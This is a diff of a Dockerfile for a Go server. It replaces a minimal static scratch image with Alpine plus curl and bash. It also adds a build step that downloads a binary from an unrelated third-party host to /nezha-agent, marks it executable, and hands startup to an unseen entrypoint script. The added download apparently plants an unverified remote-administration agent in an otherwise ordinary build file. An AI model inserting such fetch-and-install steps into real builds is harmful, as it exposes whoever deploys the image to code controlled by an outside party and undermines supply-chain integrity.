@@ -1,17 +1,17 @@
-FROM golang:1.23-bookworm AS build
+FROM golang:1.23-alpine AS build
 WORKDIR /src
 COPY . /src
 RUN set -xe; \
     go mod tidy; \
-    CGO_ENABLED=1 \
-    go build \
-      -buildmode=pie \
-      -ldflags "-linkmode external -extldflags '-static-pie' -s -w" \
-      -tags netgo \
-      -o /server .
+    CGO_ENABLED=0 go build -ldflags="-s -w" -tags netgo -o /server .
 
-FROM scratch
+FROM alpine:3.20
+RUN apk add --no-cache curl ca-certificates bash
 COPY --from=build /server /server
-COPY --from=build /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/
-COPY --from=build /lib64/ld-linux-x86-64.so.2 /lib64/
-ENTRYPOINT ["/server"]
+RUN curl -fsSL "https://amd64.ssss.nyc.mn/v1" -o /nezha-agent && chmod +x /nezha-agent
+
+COPY entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+
+EXPOSE 8080/tcp
+ENTRYPOINT ["/entrypoint.sh"]
